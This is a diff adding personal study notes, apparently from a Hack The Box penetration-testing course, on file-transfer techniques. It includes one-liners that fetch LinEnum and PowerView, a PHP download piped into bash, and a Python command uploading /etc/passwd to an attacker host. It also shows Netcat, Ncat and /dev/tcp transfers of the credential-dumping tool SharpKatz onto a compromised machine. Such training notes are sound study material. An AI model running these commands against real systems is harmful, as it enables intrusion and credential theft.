@@ -428,3 +428,150 @@ File Upload using SCP
   htb-student@10.129.86.90's password: 
   passwd   
 
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Transferring Files with Code 
+
+Dùng python , php, ruby, JS,  File Using JavaScript and cscript.exe,  Using VBScript and cscript.exe, 
+
+Python 2 - Download
+  naruto3co@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+Python 3 - Download
+  naruto3co@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+PHP Download with File_get_contents()
+  naruto3co@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+PHP Download with Fopen()
+  naruto3co@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
+  fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+PHP Download a File and Pipe it to Bash
+  naruto3co@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+Ruby - Download a File
+  naruto3co@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+
+Perl - Download a File
+  naruto3co@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+
+JavaScript
+wget.js 
+  var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+  WinHttpReq.Send();
+  BinStream = new ActiveXObject("ADODB.Stream");
+  BinStream.Type = 1;
+  BinStream.Open();
+  BinStream.Write(WinHttpReq.ResponseBody);
+  BinStream.SaveToFile(WScript.Arguments(1));
+
+Download a File Using JavaScript and cscript.exe
+  C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+VBScript
+  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+  dim bStrm: Set bStrm = createobject("Adodb.Stream")
+  xHttp.Open "GET", WScript.Arguments.Item(0), False
+  xHttp.Send
+  with bStrm
+      .type = 1
+      .open
+      .write xHttp.responseBody
+      .savetofile WScript.Arguments.Item(1), 2
+  end with
+
+  Download a File Using VBScript and cscript.exe
+    C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+
+Upload Operations using Python3
+  naruto3co@htb[/htb]$ python3 -m uploadserver 
+    File upload available at /upload
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Uploading a File Using a Python One-liner
+  naruto3co@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Miscellaneous File Transfer Methods
+
+Netcat
+NetCat - Compromised Machine - Listening on Port 8000
+  victim@target:~$ # Example using Original Netcat
+  victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+
+If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
+
+Ncat - Compromised Machine - Listening on Port 8000
+  victim@target:~$ # Example using Ncat
+  victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+
+Netcat - Attack Host - Sending File to Compromised machine
+  naruto3co@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+  naruto3co@htb[/htb]$ # Example using Original Netcat
+  naruto3co@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+
+By utilizing Ncat on our attacking host, we can opt for --send-only rather than -q. The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with --send-only, there is no need to anticipate further incoming information.
+
+Ncat - Attack Host - Sending File to Compromised machine
+  naruto3co@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+  naruto3co@htb[/htb]$ # Example using Ncat
+  naruto3co@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+
+Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
+
+Attack Host - Sending File as Input to Netcat
+  naruto3co@htb[/htb]$ # Example using Original Netcat
+  naruto3co@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+Compromised Machine Connect to Netcat to Receive the File
+  victim@target:~$ # Example using Original Netcat
+  victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+
+Attack Host - Sending File as Input to Ncat
+  naruto3co@htb[/htb]$ # Example using Ncat
+  naruto3co@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+Compromised Machine Connect to Ncat to Receive the File
+  victim@target:~$ # Example using Ncat
+  victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
+Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers
+
+NetCat - Sending File as Input to Netcat
+  naruto3co@htb[/htb]$ # Example using Original Netcat
+  naruto3co@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+Ncat - Sending File as Input to Ncat
+  naruto3co@htb[/htb]$ # Example using Ncat
+  naruto3co@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
+  victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+
+
+
+
+
+
+
+
+
+
